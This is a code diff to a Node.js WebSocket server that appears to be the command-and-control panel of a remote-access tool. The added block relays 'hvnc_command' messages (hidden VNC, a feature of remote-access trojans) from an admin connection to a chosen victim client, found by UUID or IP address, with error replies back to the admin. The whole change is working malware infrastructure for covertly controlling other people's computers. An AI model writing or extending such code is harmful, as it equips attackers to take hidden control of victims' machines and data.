@@ -1,4 +1,4 @@
-﻿const { debugLog } = require('../utils/debugLogger');
+const { debugLog } = require('../utils/debugLogger');
 const mongoose = require('mongoose');
 const Client = require('../models/Client');
 const Task = require('../models/Task');
@@ -794,6 +794,60 @@ const wsHandler = (ws, req) => {
                     frameInfo,
                     timestamp: new Date().toISOString()
                 });
+                return;
+            }
+
+            // Handle HVNC command from admin to forward to client
+            if (data.type === 'hvnc_command' && clientType === 'admin') {
+                const { targetId, sessionId, command, params } = data;
+                
+                // Find the target client WebSocket by UUID
+                let targetClient = null;
+                let targetUuid = null;
+                
+                if (targetId && targetId.length === 36 && targetId.includes('-')) {
+                    targetClient = connectedClients.get(targetId);
+                    targetUuid = targetId;
+                } else {
+                    // Try to find by IP address
+                    for (const [uuid, client] of connectedClients.entries()) {
+                        if (client.ipAddress === targetId || client.ipAddress === targetId.replace(/[()]/g, '')) {
+                            targetClient = client;
+                            targetUuid = uuid;
+                            break;
+                        }
+                    }
+                }
+                
+                if (targetClient && targetClient.clientType === 'client') {
+                    // Forward HVNC command to client
+                    const hvncCommand = {
+                        type: 'hvnc_command',
+                        sessionId,
+                        command,
+                        params: params || {}
+                    };
+                    
+                    try {
+                        targetClient.send(JSON.stringify(hvncCommand));
+                        console.log(`HVNC command forwarded to client ${targetUuid}: ${command}`);
+                    } catch (wsError) {
+                        console.error(`Failed to forward HVNC command to client ${targetUuid}:`, wsError);
+                        ws.send(JSON.stringify({
+                            type: 'hvnc_command_error',
+                            targetId,
+                            error: 'Failed to forward command to client',
+                            timestamp: new Date().toISOString()
+                        }));
+                    }
+                } else {
+                    ws.send(JSON.stringify({
+                        type: 'hvnc_command_error',
+                        targetId,
+                        error: 'Client not found or not connected',
+                        timestamp: new Date().toISOString()
+                    }));
+                }
                 return;
             }
 
